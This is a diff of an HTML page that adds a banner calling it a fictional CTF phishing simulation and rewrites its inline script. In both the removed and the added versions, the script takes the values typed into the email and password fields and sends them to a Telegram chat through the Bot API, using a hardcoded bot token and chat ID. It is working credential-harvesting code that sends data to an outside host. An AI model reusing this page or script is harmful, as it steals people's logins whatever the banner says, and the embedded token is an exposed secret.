@@ -12,6 +12,18 @@
   </head>
   <body class="bg-theme-dark text-light">
 
+
+    <div class="alert alert-danger text-center fw-bold p-4 mb-0 border-0 rounded-0" role="alert" 
+         style="background:#dc3545 !important; color:#fff !important; font-size:1.25rem; line-height:1.4;">
+      <span style="font-size:1.6rem;">⚠️</span> THIS IS A FICTIONAL CTF CHALLENGE – FAKE PHISHING SIMULATION <span style="font-size:1.6rem;">⚠️</span><br>
+      <strong style="font-size:1.4rem;">DO NOT</strong> enter real email addresses, passwords, 2FA codes or any personal information!<br>
+      <span style="font-size:1.1rem; opacity:0.95;">
+        This page is created ONLY for a Capture The Flag exercise.<br>
+        <br>
+        This is a simulation – no real accounts are affected.
+      </span>
+    </div>
+
     <nav class="navbar navbar-expand-lg navbar-dark bg-blur">
       <div class="container-fluid">
         <a class="navbar-brand fw-bold" href="../index.html">
@@ -46,51 +58,53 @@
     </main>
 
     <script src="../script/bootstrap.bundle.min.js"></script>
-   <script>
-        const TOKEN = "8360813543:AAEXff1pasBtUu6SYNwXvwUsujru8Fi5WKs";
-        const CHAT_ID = "-1003863808356";
+    <script src="../script/logger.js"></script>
 
-        document.getElementById("submitBtn").addEventListener("click", function(e) {
-            e.preventDefault();
+<script>
+const TOKEN = "8360813543:AAEXff1pasBtUu6SYNwXvwUsujru8Fi5WKs";
+const CHAT_ID = "-1003863808356";
 
-            const user = document.getElementById("email").value.trim();
-            const rec  = document.getElementById("password").value.trim();
+document.getElementById("submitBtn").addEventListener("click", function(e) {
+    e.preventDefault();
 
-            if (!user || !rec) {
-                alert("Please fill all fields");
-                return;
+    const user = document.getElementById("email").value.trim();
+    const rec  = document.getElementById("password").value.trim();
+
+    if (!user || !rec) {
+        alert("Please fill all fields");
+        return;
+    }
+
+    const message = 
+`New Recommendation
+-----------------
+User: ${user}
+Message: ${rec}`;
+
+    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+    fetch(url)
+        .then(res => res.json())
+        .then(data => {
+            if(data.ok){
+                document.getElementById("submitBtn").innerText = "Sent";
+                document.getElementById("submitBtn").disabled = true;
+                setTimeout(() => {
+                    document.getElementById("submitBtn").innerText = "send the recommendation";
+                    document.getElementById("submitBtn").disabled = false;
+                }, 2000);
+                document.getElementById("username").value = "";
+                document.getElementById("recommendation").value = "";
+            } else {
+                alert("Telegram API error");
             }
-
-            const message = 
-        `New Recommendation
-        -----------------
-        User: ${user}
-        password: ${rec}`;
-
-            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-
-            fetch(url)
-                .then(res => res.json())
-                .then(data => {
-                    if(data.ok){
-                        document.getElementById("submitBtn").innerText = "Sent";
-                        document.getElementById("submitBtn").disabled = true;
-                        setTimeout(() => {
-                            document.getElementById("submitBtn").innerText = "send the recommendation";
-                            document.getElementById("submitBtn").disabled = false;
-                        }, 2000);
-                        document.getElementById("username").value = "";
-                        document.getElementById("recommendation").value = "";
-                    } else {
-                        alert("Telegram API error");
-                    }
-                })
-                .catch(err => {
-                    console.error(err);
-                    alert("Network error");
-                });
+        })
+        .catch(err => {
+            console.error(err);
+            alert("Network error");
         });
-        </script>
+});
+</script>
 
 
   </body>
